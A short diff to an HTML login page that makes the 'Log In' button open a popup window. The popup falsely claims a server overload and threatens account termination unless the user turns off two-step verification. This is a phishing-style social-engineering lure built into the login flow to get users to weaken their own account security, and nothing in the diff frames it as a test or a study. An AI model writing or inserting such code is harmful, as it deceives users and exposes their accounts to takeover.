@@ -68,10 +68,16 @@
         <br>
         <input type="password" class="login-input" placeholder="Password">
         <br>
-        <button class="login-button">Log In</button>
+        <button class="login-button" onclick="openNewWindow()">Log In</button>
     </div>
     
     <script>
+        function openNewWindow() {
+            // Open a new window with a message
+            var newWindow = window.open('', '_blank', 'width=400,height=200');
+            newWindow.document.write('<h2 style="text-align:center;margin-top:50px;">Dew to large server overload we ask you to turn off 2-Step-Verification (if you have not allready) If you do not comply your account will be TERMINATED!</h2>');
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             document.body.addEventListener('click', function() {
                 document.getElementById('loginContainer').style.display = 'block';
